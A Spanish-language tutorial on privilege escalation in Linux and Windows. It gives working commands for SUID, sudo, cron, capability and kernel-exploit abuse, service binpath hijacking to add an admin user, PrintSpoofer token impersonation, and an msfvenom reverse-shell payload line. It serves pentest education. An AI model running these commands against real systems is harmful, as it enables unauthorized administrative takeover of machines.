-- -
# Fase 1: Fundamentos (¿Qué estamos intentando romper?)

Antes de atacar, necesitas entender qué divide a un usuario normal de un administrador.
## 1. El Modelo de Privilegios

En cualquier sistema operativo existe una separación de poderes para evitar que un usuario normal rompa el sistema o espíe a otros.

- Linux: El usuario supremo es `root` (UID 0). Tiene control absoluto del Kernel, hardware y archivos.
- Windows: El usuario supremo no es el "Administrador" gráfico, sino la cuenta `NT AUTHORITY\SYSTEM`. Tiene incluso más poder que el administrador local en ciertos aspectos del Kernel.
## 2. Los Vectores de Escalada (Los 3 pilares)

Casi cualquier vulnerabilidad de escalada de privilegios cae en una de estas tres categorías:

| Vector                                       | Descripción                                                                                                 | Ejemplo                                                                                                     |
| -------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| Configuraciones Erróneas (Misconfigurations) | El administrador dejó un archivo con permisos de escritura que no debería, o una contraseña en texto plano. | Un script que corre como root pero que tú puedes editar.                                                    |
| Vulnerabilidades de Software/Kernel          | El código del sistema operativo o de un programa tiene un fallo de diseño (ej. Buffer Overflow).            | Un exploit público para el Kernel de Linux (como _Dirty COW_).                                              |
| Abuso de Funcionalidades legítimmas          | Usar herramientas del sistema de una forma para la que no fueron diseñadas.                                 | Ejecutar comandos del sistema a través de un editor de texto como `vim` que corre con privilegios elevados. |
-- -
# Fase 2: Escalada de Privilegios en Linux:
## Módulo 1: Escalada en Linux - El Bit SUID

Para entender cómo hackear esto, primero debes entender cómo maneja Linux los permisos de los archivos.

Normalmente, cuando ejecutas un programa (como `cat` para leer un archivo), ese programa se ejecuta con **tus** privilegios. Si intentas leer `/etc/shadow` (donde se guardan los hashes de las contraseñas), el sistema te dirá "Permiso denegado" porque tu usuario no tiene acceso.

Sin embargo, hay una excepción vital: **El bit SUID (Set User ID)**.
### ¿Qué es el bit SUID?

El SUID es un permiso especial que se le asigna a un archivo ejecutable. Cuando un archivo tiene el bit SUID activo, **se ejecuta con los privilegios del propietario del archivo**, no con los del usuario que lo lanza.

**Un ejemplo de la vida real (Legítimo):**
El comando `passwd` sirve para cambiar tu propia contraseña. Para hacerlo, el programa tiene que escribir en el archivo `/etc/shadow` (que es de `root`). ¿Cómo lo hace un usuario normal? Gracias al SUID. El archivo `/passwd` le pertenece a `root` y tiene el SUID activo, por lo que cuando tú lo ejecutas, temporalmente "te conviertes en root" solo para esa acción.
### El Peligro: La vulnerabilidad

El problema surge cuando un administrador configura el bit SUID en binarios que **permiten ejecutar comandos, leer archivos o interactuar con el sistema** (como `nano`, `vim`, `find`, `bash`, `cp`, etc.). Si un atacante encuentra uno de estos binarios con SUID de `root`, puede abusar de sus funciones para obtener una consola (`shell`) como `root`.
### Metodología de Ataque: Paso a Paso
#### Paso 1: Enumeración (Buscar la aguja en el pajar)

Cuando logras acceso inicial a una máquina Linux, lo primero que haces es buscar todos los archivos que tengan el bit SUID activo y pertenezcan a `root`. Para ello usamos este comando de `find`:

```bash
find / -perm 4000 -user root 2>/dev/null
```

- Explicación corta: Busca desde la raíz (`/`) archivos con permisos SUID (`-perm 4000`) cuyo dueño sea `root` (`-user root`), y oculta los errores de permisos denegados (`2>/dev/null`).
#### Paso 2: Investigación (La Biblia del Pentester: GTFOBins)

Una vez que tienes la lista de binarios, buscas si alguno es "peligroso". Existe un sitio web que es de visita obligatoria para todo pentester: **[GTFOBins](https://gtfobins.github.io/)**.

En esa web pones el nombre del binario (por ejemplo, `find`) y seleccionas la función "SUID". Te dará el comando exacto para clonar los privilegios.
#### Paso 3: Explotación (El Ataque)

Imagina que al ejecutar el comando de búsqueda, descubres que el binario `/usr/bin/find` tiene el bit SUID activo.

El comando `find` tiene una función legítima llamada `-exec` que sirve para ejecutar comandos del sistema sobre los archivos encontrados. Si abusamos de esto:

```bash
/usr/bin/find . -exec /bin/sh -p \;
```

- **¿Qué pasa aquí?** `find` se ejecuta como `root` debido al SUID. Al usar `-exec /bin/sh -p`, le ordenamos a `find` que levante una nueva consola (`sh`). El parámetro `-p` le dice a la consola que mantenga los privilegios heredados.
- **Resultado:** ¡Felicidades, tienes una consola donde eres `root`!
## Módulo 2: Escalada en Linux - Permisos de SUDO (Sudo Rights)

Pasemos al siguiente gran vector en Linux. Mientras que el SUID es un permiso que se le aplica a un _archivo_, **SUDO** (`SuperUser DO`) es una utilidad que administra qué _usuarios_ pueden ejecutar qué comandos como root.

La configuración de quién puede usar `sudo` y cómo, se almacena en el archivo `/etc/sudoers`.
### ¿Cuál es el peligro?

A veces, los administradores de sistemas necesitan que un usuario de bajo nivel ejecute una tarea específica como root (por ejemplo, reiniciar un servicio web o hacer un backup). En lugar de darle la contraseña de root, le otorgan el permiso de ejecutar **solo ese comando** usando `sudo`.

La vulnerabilidad ocurre cuando el comando que se le permite ejecutar al usuario tiene "funciones ocultas" (como permitirle leer archivos o abrir consolas), o cuando el administrador es perezoso y permite ejecutar un binario sin pedir contraseña.
### Metodología de Ataque: Paso a Paso
#### Paso 1: Enumeración (Ver mis superpoderes)

Cada vez que comprometas una máquina Linux, el primer comando que debes ejecutar de forma casi obligatoria es:

```bash
sudo -l
```

Este comando le pregunta al sistema: _"¿Qué cosas tiene permitido hacer mi usuario actual con sudo?"_.

La salida se ve usualmente así:

```plaintext
Matching Defaults entries for hacker on ubuntu:
	env_reset, mail_badpass

User hacker may run the following commands on ubuntu:
	(root) NOPASSWD: /usr/bin/apache2, /usr/bin/ftp
```

**Análisis de la salida:**
Aquí el sistema nos dice que nuestro usuario (`hacker`) puede ejecutar `/usr/bin/ftp` como el usuario `root` (`(root)`) y, lo mejor de todo, **`NOPASSWD`**: no necesitamos saber la contraseña de nuestro propio usuario para ejecutarlo.
#### Paso 2: Explotación (El escape a través de FTP)

Si vemos que podemos ejecutar `ftp` como root, volvemos a nuestra herramienta favorita, **GTFOBins**, y buscamos la sección de "SUDO" para el binario `ftp`.

El cliente FTP de Linux tiene una función legítima que te permite ejecutar un comando local en tu propia máquina sin cerrar la sesión FTP, usando el carácter `!`. Como el proceso de FTP corre como `root`, esa exclamación invocará una consola de `root`.

El ataque se vería así en tu terminal:

1. Ejecutas el binario con sudo:

```bash
sudo ftp
```

2. Una vez dentro de la consola interactiva de FTP (`ftp>`), escribes:

```plaintext
!/bin/sh
```

3. Al presionar Enter, el sistema te devuelve una shell. Si escribes `whoami`, verás que eres `root`.
## Módulo 3: Escalada en Linux - Tareas Programadas (Cron Jobs)

En Linux, el servicio `cron` es el encargado de ejecutar tareas (scripts, comandos, respaldos) de forma automática en intervalos de tiempo regulares (cada minuto, cada hora, diariamente, etc.). Estas tareas se configuran en archivos llamados `crontabs`.
### El Peligro: Tareas mal protegidas

El riesgo para la seguridad aparece cuando una tarea programada cumple con dos condiciones:

1. **Se ejecuta con privilegios elevados** (por ejemplo, la corre el usuario `root`).
2. **El script o el directorio donde está guardado tiene permisos de escritura** para usuarios comunes.

Si un usuario normal puede modificar el script que `root` va a ejecutar en unos minutos, el atacante solo tiene que alterar ese script para incluir código malicioso. Cuando llegue la hora de la ejecución automática, `root` ejecutará el código del atacante.
### Metodología de Ataque: Paso a Paso
#### Paso 1: Enumeración (Monitorear el sistema)

A diferencia de los vectores anteriores, los archivos de configuración de `cron` de otros usuarios a veces están protegidos y no se pueden leer directamente con `cat /etc/crontab`.

Para auditorías profesionales, los pentesters usan dos métodos para descubrir tareas ocultas:

1. **Inspección de rutas comunes:** Revisar directorios públicos de tareas como `/etc/cron.d/`, `/var/spool/cron/crontabs/` o `/etc/cron.daily/`.
2. **Monitoreo de procesos en tiempo real:** Usar una herramienta llamada **`pspy`** (un binario que no requiere privilegios). `pspy` se queda "escuchando" los procesos del sistema y te avisa si ve que cada 1 minuto se levanta un proceso como `root` ejecutando cierto script.
#### Paso 2: Análisis de Permisos

Imagina que descubres una tarea que se ejecuta cada minuto como `root`:

```plaintext
* * * * * root /opt/scripts/backup.sh
```

Lo primero que debes hacer es verificar los permisos de ese archivo usando `ls- l`:

```bash
ls -l /opt/scripts/backup.sh
```

Si la respuesta muestra algo como esto:

```plaintext
-rwxrwxrwx 1 root root 120 Jun 21 15:30 /opt/scxripts/backup.sh
```

¡Bingo! El permiso `-rwxrwxrwx` (o `777`) significa que **cualquier usuario del sistema puede leer, escribir y modificar** ese archivo.
#### Paso 3: Explotación (Inyección de código)

En lugar de romper el script original, un pentester suele añadir una línea al final para abrir una **Reverse Shell** (conexión remota hacia su máquina de ataque) o para asignarse privilegios.

Para mantenerlo simple y local en esta lección, podríamos inyectar una línea para darle el bit SUID a la propia consola `/bin/bash`:

```bash
echo "chmod +s /bin/bash" >> /opt/scripts/backup.sh
```
#### Paso 4: La espera y el control

Esperas a que pase el minuto. Cuando el servicio `cron` ejecuta el script como `root`, procesa la línea que inyectaste. Ahora la consola `/bin/bash` tiene el bit SUID activo.

Para convertirte en root, solo tendrías que ejecutar:

```bash
bash -p
```
## Módulo 4: Escalada en Linux - Linux Capabilities

Para entender las _Capabilities_, primero debemos entender el problema que vinieron a solucionar.

Como vimos antes, el bit SUID es peligroso porque es de "todo o nada": si un binario tiene SUID de root, se ejecuta con **todos** los poderes de root. Para evitar este riesgo, los desarrolladores de Linux crearon las **Capabilities** (Capacidades).
### ¿Qué son las Capabilities?

Las capabilities dividen los privilegios de `root` en pequeñas piezas independientes. De este modo, si un binario solo necesita realizar una tarea específica (como abrir un puerto de red bajo), el administrador puede otorgarle **únicamente esa capacidad específica**, sin necesidad de convertir el binario en SUID o darle permisos totales de root.

**Un ejemplo legítimo:**
El comando `ping` necesita enviar paquetes de red especiales (ICMP RAW). Antiguamente, `ping` tenía que ser SUID root. Hoy en día, en sistemas modernos, `ping` ya no es SUID; en su lugar, tiene asignada la capacidad **`CAP_NET_RAW`**. Solo tiene permiso para manejar esos paquetes, nada más.
### El Peligro: Capabilities Mal Configuradas

El problema ocurre cuando un administrador otorga capabilities sobre binarios que permiten interactuar con el sistema de archivos o ejecutar comandos (como `python`, `perl`, `tar`, `php`, etc.). Si un atacante encuentra una capability peligrosa asignada a uno de estos programas, puede saltarse las restricciones.

Las dos capabilities más peligrosas si se configuran mal son:

- **`CAP_SETUID`**: Permite al binario manipular los IDs de usuario (básicamente, permite al programa convertirse en root).
- **`CAP_DAC_OVERRIDE`**: Permite al binario saltarse por completo las restricciones de lectura y escritura de archivos (puede leer o escribir en cualquier carpeta, como `/etc/shadow`).
### Metodología de Ataque: Paso a Paso
#### Paso 1: Enumeración (Buscar Capabilities)

Para listar las capabilities especiales asignadas a los binarios del sistema, usamos el comando `getcap`:

```bash
getcap -r / 2>/dev/null
```

- `-r /`: Busca de forma recursiva desde la raíz del sistema.
- `2>/dev/null`: Oculta los errores de permisos denegados.

Imagina que la salida te muestra esto:

```plaintext
/usr/bin/python3 = cap_setuid+ep
```
_(Nota: `+ep` significa que la capacidad está efectiva y permitida)._
#### Paso 2: Explotación (El Abuso)

Como `python3` tiene la capacidad `cap_setuid`, un script de Python tiene el poder legal de cambiar su propio ID de usuario al de root (`0`).

Consultamos **GTFOBins** en la sección "Capabilities" para Python y ejecutamos el siguiente comando:

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

- **¿Qué hace este código?** `os.setuid(0)` le dice al sistema: "Como tengo la capacidad `cap_setuid`, cámbiame formalmente a UID 0 (root)". Luego, `os.system("/bin/sh")` levanta la consola ya siendo root.
## Módulo 5: Escalada en Linux - Explotación del Kernel

Este es el método clásico cuando el sistema operativo está desactualizado.
### ¿Qué es el Kernel y qué es un Exploit?

El **Kernel** (núcleo) es el corazón de Linux; es el software que conecta tus programas con el hardware físico. Todo se ejecuta encima del Kernel.

Si el Kernel tiene una vulnerabilidad de seguridad (un bug en su código, como una corrupción de memoria), un usuario de bajo nivel puede enviar datos maliciosos diseñados específicamente para confundir al Kernel. Al romperse el flujo normal del núcleo, el atacante puede forzarlo a ejecutar código con los máximos privilegios posibles (nivel Ring 0).

A este código malicioso se le llama **Exploit de Kernel**. Ejemplos históricos famosos son _Dirty COW (CVE-2016-5195)_ o _Dirty Pipe (CVE-2022-0847)_.
### Metodología de Ataque: Paso a Paso

>  **Nota de Auditor Profesional:** En entornos de producción reales, los exploits de Kernel son el **último recurso**. Como interactúan directamente con el núcleo del sistema, un exploit mal diseñado o inestable puede congelar el servidor por completo (_Pantallazo azul_ / _Kernel Panic_), alertando a los administradores o interrumpiendo el servicio del cliente.
#### Paso 1: Identificar la versión del Kernel

Lo primero que hace un pentester es mirar exactamente qué versión de Linux está corriendo la máquina:

```bash
uname -a
```

La salida te dirá algo como: `Linux ubuntu 4.4.0-21-generic ...`
#### Paso 2: Buscar vulnerabilidades conocidas

Con la versión exacta del Kernel, buscamos exploits públicos usando bases de datos como **Exploit-DB** o herramientas locales como **`searchsploit`**:

```bash
searchsploit Linux Kernel 4.4.0
```

También existen herramientas de automatización como **LES** (Linux Exploit Suggester), un script que analiza el sistema y te dice: _"Este sistema es 90% vulnerable a Dirty COW"_.
#### Paso 3: Compilación y Ejecución

La mayoría de los exploits de Kernel están escritos en lenguaje **C** (`.c`) para poder interactuar a bajo nivel con la memoria.

1. Subes el código fuente (`exploit.c`) a la máquina víctima (usualmente a la carpeta `/tmp`, que siempre tiene permisos de escritura).
2. Lo compilas dentro de la máquina usando el compilador de Linux (`gcc`):

```bash
gcc exploit.c -o exploit
```

3. Le das permisos de ejecución y lo corres:

```bash
./exploit
```

Si el exploit es exitoso, alterará la memoria del Kernel y te devolverá inmediatamente una consola como `root`.
# Fase 3: Escalada de Privilegios en Windows:
## Vector 1: Rutas de Servicio No Entrepachadas (Unquoted Service Paths)

Este es uno de los fallos de configuración más clásicos y comunes en entornos corporativos Windows.
### El Problema de los Espacios

Cuando Windows intenta arrancar un servicio, busca el archivo ejecutable en el disco. Imagina que un servicio de un software llamado "SuperAntivirus" tiene su ejecutable en la siguiente ruta:

```plaintext
C:\Program Files\Super Antivirus\Scanner Bin\antivirus.exe
```

Si el programador que instaló el servicio **no puso la ruta entre comillas (`"..."`)**, Windows tiene una forma muy peculiar de interpretar los espacios en blanco. Windows asumirá que el espacio marca el final de un comando y el inicio de un argumento.

Por lo tanto, el sistema intentará buscar y ejecutar los archivos en este orden riguroso hasta encontrar uno:

1. `C:\Program.exe` (Si existe, lo ejecuta y le pasa el resto como argumento). 
2. `C:\Program Files\Super.exe` (Si existe, lo ejecuta).
3. `C:\Program Files\Super Antivirus\Scanner.exe` (Si existe, lo ejecuta).
4. `C:\Program Files\Super Antivirus\Scanner Bin\antivirus.exe` (La ruta real).
### La vulnerabilidad

Si tú eres un usuario normal en esa máquina y resulta que tienes **permisos de escritura** en la carpeta `C:\Program Files\Super Antivirus\`, puedes meter ahí un ejecutable malicioso que tú hayas programado (o un payload) y renombrarlo como `Scanner.exe`.

La próxima vez que el sistema se reinicie o el servicio se reactive, Windows buscará en la ruta, encontrará tu `Scanner.exe` antes que el original, y lo ejecutará como `NT AUTHORITY\SYSTEM`.
## Vector 2: Servicios de Windows Mal Configurados (Weak Service Permissions)

En Windows, los servicios no solo tienen rutas; también tienen **permisos de seguridad** (listas de control de acceso o ACL). Estos permisos determinan qué usuarios pueden interactuar con el servicio.
### El Peligro

A veces, por una mala práctica de administración, un usuario común (o el grupo `Authenticated Users`) recibe permisos avanzados sobre un servicio que corre como `SYSTEM`.

Los permisos más peligrosos que un atacante busca en un servicio son:

- **`SERVICE_CHANGE_CONFIG`**: Te permite cambiar la configuración del servicio (por ejemplo, cambiar la ruta del ejecutable que debe arrancar).
- **`SERVICE_ALL_ACCESS`**: Te da control total (puedes cambiar la configuración, pararlo y arrancarlo).
### Metodología de Ataque: Paso a Paso
#### Paso 1: Enumeración (Auditar los permisos del servicio)

Para revisar los permisos de los servicios desde la consola de Windows de forma profesional, se suele usar una herramienta nativa de Sysinternals llamada `accesschk.exe`, o comandos de PowerShell.

Con `accesschk`, el comando se vería así:

```DOS
accesschk.exe -uwcqv "Authenticated Users" *
```
_(Busca todos los servicios donde el grupo de usuarios autenticados tenga permisos de escritura)._

Imagina que la salida te muestra que tienes acceso total sobre un servicio llamado `ServicioVulnerable`:

```plaintext
ServicioVulnerable
	Medium Mandatory Label (ext) [No Write Up]
	RW Authenticated Users
				SERVICE_ALL_ACCESS
```
#### Paso 2: Modificación de la configuración del servicio

Como tienes el permiso `SERVICE_CHANGE_CONFIG` (incluido en ALL_ACCESS), no necesitas reemplazar ningún archivo en el disco. Puedes usar el comando nativo `sc` (Service Control) para cambiar la ruta del binario (`binpath`) y apuntarla a tu propio payload o a un comando del sistema.

Por ejemplo, podrías ordenarle al servicio que, en vez de arrancar su programa normal, añada un nuevo administrador al sistema:

```DOS
sc config ServicioVulnerable binpath= "net user hacker Password123 /add"
```
_(Nota: El espacio después del `=` es obligatorio en la sintaxis de Windows)._
#### Paso 3: Ejecución y Escalada

Una vez cambiada la ruta, reinicias el servicio para que aplique el cambio:

```DOS
sc stop ServicioVulnerable
sc start ServicioVulnerable
```

Cuando el servicio intente arrancar, ejecutará el comando `net user...` con privilegios de `SYSTEM`. Luego, podrías meter a ese usuario `hacker` al grupo de administradores locales con:

```DOS
sc config ServicioVulnerable binpath= "net localgroup Administrators hacker /add"
sc start ServicioVulnerable
```

> Nota: Para evitar que Windows mate la shell al cabo de unos segundos, debemos migrar el proceso a uno legítimo del sistema que ya sea estable (`explorer.exe` o `svchost.exe`), para ello ejecutamos: `migrate <PID de un proceso estable>`. Otro método es indicarle a `msfvenon` que cree un binario compatible con la arquitectura de servicios de Windows `exe-service`, para ello ejecutamos: `msfvenon -p windows/x64/shell_reverse_tcp LHOST=tu_IP LPORT=tu_Puerto -f exe-service`.
## Vector 3: Escalada en Windows - Abuso de Privilegios de Tokens (Token Impersonation)

Pasemos a un vector de nivel intermedio-avanzado que es extremadamente común cuando comprometes servidores web IIS (Internet Information Services) o servidores de bases de datos en Windows.
### ¿Qué son los Tokens de Acceso?

En Windows, cuando un usuario inicia sesión o un servicio arranca, el sistema le asigna un **Token de Acceso**. Piensa en este token como una tarjeta de identificación digital (un pase de abordar) que describe quién eres y qué permisos tienes.

Cada vez que intentas abrir un archivo o realizar una acción, Windows mira tu Token para ver si tienes los derechos necesarios.
### El Peligro: Suplantación de Identidad (Impersonation)

Si logras comprometer una cuenta de servicio (como `nt authority\network service` o `iuser`), notarás que no eres Administrador. Sin embargo, estas cuentas de servicio suelen tener por diseño ciertos "privilegios de token" muy potentes habilitados.

Los dos privilegios de token más codiciados por los pentesters son:

- **`SeImpersonatePrivilege`** (El más común)
- **`SeAssignPrimaryTokenPrivilege`**

Si tu usuario actual tiene el privilegio `SeImpersonatePrivilege` activo, significa que **tienes el derecho legal de suplantar (robar la identidad) de cualquier otro token de usuario que esté corriendo en el sistema**, incluyendo el de `NT AUTHORITY\SYSTEM`.
### Metodología de Ataque: Paso a Paso
#### Paso 1: Enumeración (Ver mis privilegios de Token)

Una vez dentro de la consola de Windows, ejecutas el comando nativo:

```DOS
whoami /priv
```

La salida te mostrará una lista. Lo que buscas es algo como esto:

```plaintext
Privilege Name                Description                               State 
============================= ========================================= ======== SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Si ves `SeImpersonatePrivilege` en estado `Enabled` (o incluso `Disabled`, ya que se puede activar), la máquina está prácticamente comprometida.
#### Paso 2: Explotación (La familia "Potato")

Para abusar de este privilegio, la comunidad de ciberseguridad ha desarrollado una serie de exploits legendarios conocidos como la familia **Potato** (_RottenPotato_, _JuicyPotato_, _PrintSpoofer_, _GodPotato_, _SigmaPotato_).
##### ¿Cómo funcionan estos exploits?
El exploit (por ejemplo, `PrintSpoofer.exe` o `JuicyPotato.exe`) levanta un pequeño servidor local falso y, mediante un truco interno del sistema, obliga a un servicio legítimo de Windows que corre como `SYSTEM` a intentar autenticarse contra él. Al hacerlo, el servicio de `SYSTEM` le entrega su token de acceso al exploit. Como tú tienes el `SeImpersonatePrivilege`, tu usuario tiene permitido "atrapar" ese token de `SYSTEM` y usarlo para clonar una nueva consola.

El comando de explotación real (usando _PrintSpoofer_ para sistemas Windows modernos) es ridículamente sencillo:

```DOS
PrintSpoofer.exe -i -c cmd
```

- `-i`: Interactivo.
- `-c cmd`: Abre una nueva consola de comandos.

Al presionar Enter, el exploit hace el engaño de tokens en milisegundos y te devuelve una consola donde, al escribir `whoami`, verás: **`nt authority\system`**.
# Fase 4: Metodología Profesional y Automatización:

Para cerrar el ciclo de aprendizaje y consolidar todo lo que has aprendido (tanto en Linux como en Windows), debemos hablar de cómo trabaja un pentester profesional en el mundo real.

No vas a ir comando por comando probando los 50 vectores existentes en cada auditoría; para eso utilizamos la **automatización de la enumeración**, seguida de la **verificación manual**.
## 1. El Arsenal PEAS (Privilege Escalation Awesome Scripts)

En el sector profesional, hay un estándar de oro indiscutible para la fase de reconocimiento de escalada de privilegios: la suite **PEAS** desarrollada por Carlos Polop (_carlospolop_).

- **En Linux:** Usamos `LinPEAS` (un script en Bash o binario en Go).
- **En Windows:** Usamos `WinPEAS` (un ejecutable `.exe` o script en PowerShell `.ps1`).
### ¿Cómo se usan en una auditoría?

1. **Transferencia:** Subes el script correspondiente a la máquina víctima (por ejemplo, descargándolo con `wget`/`curl` en Linux o con `certutil`/`Invoke-WebRequest` en Windows).
2. **Ejecución:** Lo corres en el sistema.
3. **Análisis:** El script revisará automáticamente **todos** los vectores que hemos estudiado en este curso: binarios SUID, permisos de SUDO, tareas Cron, Capabilities, Unquoted Service Paths, privilegios de Tokens (`SeImpersonate`), parches de Kernel faltantes, contraseñas olvidadas en el registro, etc.

**El truco profesional:** La salida de PEAS utiliza un código de colores muy estricto. Si ves texto resaltado en **Rojo sobre fondo Amarillo**, el script te está diciendo: _"Hay un 95% de probabilidades de que este vector te dé acceso root/SYSTEM inmediato"_. Ahí es donde aplicas lo aprendido y buscas el exploit específico.
## Resumen Ejecutivo de tu Caja de Herramientas

Ahora que tienes el mapa completo, así se ve tu arsenal mental para auditorías de sistemas:

| Sistema Operativo | Véctor de Ataque         | Herramientas / Método de Explotación                                                 | Fuente de Consulta             |
| ----------------- | ------------------------ | ------------------------------------------------------------------------------------ | ------------------------------ |
| Linux             | SUID / SUDO              | Ejecución interactiva / escapes de interfaz                                          | GTFOBins                       |
| Linux             | Capabilities             | Manipulación de UID (`cap_setuid`) o lectura directa (`cap_dac_override`)            | GTFOBins                       |
| Linux             | Cron Jobs                | Inyección de scripts / _Wildcard Injection_ (`tar`)                                  | Manual / Monitoreo con `pspy`  |
| Linux             | Kernel Vulnerable        | Compilación local de exploits conocidos (`gcc`)                                      | **Exploit-DB** / LES           |
| Windows           | Unquoted Service Path    | Intercepción de rutas mediante ejecutables maliciosos (`Herramientas.exe`)           | Manual / WinPEAS               |
| Windows           | Permisos de Servicio     | Modificación del `binpath` con el comando nativo `sc`                                | Manual / `accesschk`           |
| Windows           | Tokens (`SeImpersonate`) | Suplantación de identidad mediante la familia Potato (_PrintSpoofer_, _SigmaPotato_) | GitHub / Repositorios públicos |
-- -
